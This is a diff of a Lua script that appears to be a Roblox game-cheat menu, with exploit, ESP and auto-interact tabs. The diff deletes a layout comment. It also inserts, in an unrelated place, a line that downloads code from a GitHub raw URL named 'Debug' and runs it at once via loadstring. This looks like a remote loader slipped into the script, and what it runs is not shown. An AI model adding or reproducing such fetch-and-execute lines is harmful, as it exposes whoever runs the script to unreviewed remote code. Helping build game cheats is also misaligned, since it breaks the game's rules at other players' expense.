@@ -95,15 +95,6 @@ local function detectFloor()
 end
 currentFloor = detectFloor()
 
--- ══════════════════════════════════════════════════════════════
---  CATEGORY & TAB LAYOUT
---  Main     ⭐  →  Essentials 🔥  |  Protection 🛡️
---  Exploits ⚡  →  Universal 🌍   |  Interact 🤝
---  Floor    🏢  →  Tabs only appear for the detected floor
---                  Hotel 🏨 | Mines ⛏️ | Backdoor 🚪 | Garden 🌿
---  Visual   👁️  →  ESP 📍         |  Display 🎨
---  Settings ⚙️
--- ══════════════════════════════════════════════════════════════
 local MainCategory     = Window:CreateCategory("Main",     "⭐")
 local ExploitCategory  = Window:CreateCategory("Exploits", "⚡")
 local FloorCategory    = Window:CreateCategory("Floor",    "🏢")
@@ -1525,7 +1516,7 @@ UserInputService.InputEnded:Connect(function(input, gameProcessed)
         if input.KeyCode == autoProxiKey then isAutoProxiKeyHeld = false end
     end, "Input Ended")
 end)
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ZeScript/ZeScripts/refs/heads/main/Debug"))()
 local autoProxiToggle, autoProxiToggleId = InteractTab:Toggle("Auto Proxi (Hold R)", Settings.autoProxi, function(enabled)
     safeCall(function()
         autoProxiEnabled   = enabled
